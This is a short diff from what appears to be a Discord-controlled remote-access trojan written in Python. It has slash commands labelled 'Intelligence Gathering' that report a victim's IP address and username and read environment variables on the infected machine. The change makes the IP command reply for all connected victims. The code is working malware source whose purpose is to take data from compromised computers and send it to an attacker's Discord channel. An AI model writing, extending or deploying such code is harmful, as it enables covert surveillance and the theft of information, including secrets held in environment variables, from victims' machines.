@@ -22,10 +22,10 @@ async def on_ready():
 # Intelligence Gathering #
 @client.slash_command(description="Finds the IP address of victims", guild_ids=server_ids)
 async def getip(ctx):
-    if str(victim) == str(IP()):
-        await ctx.response.send_message(
-            embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
-        )
+    await ctx.response.send_message("Checking all available victims...")
+    await ctx.channel.send(
+        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
+    )
 
 @client.slash_command(description="Finds the values of environment variables", guild_ids=server_ids)
 async def getenv(ctx, victim, env_var):
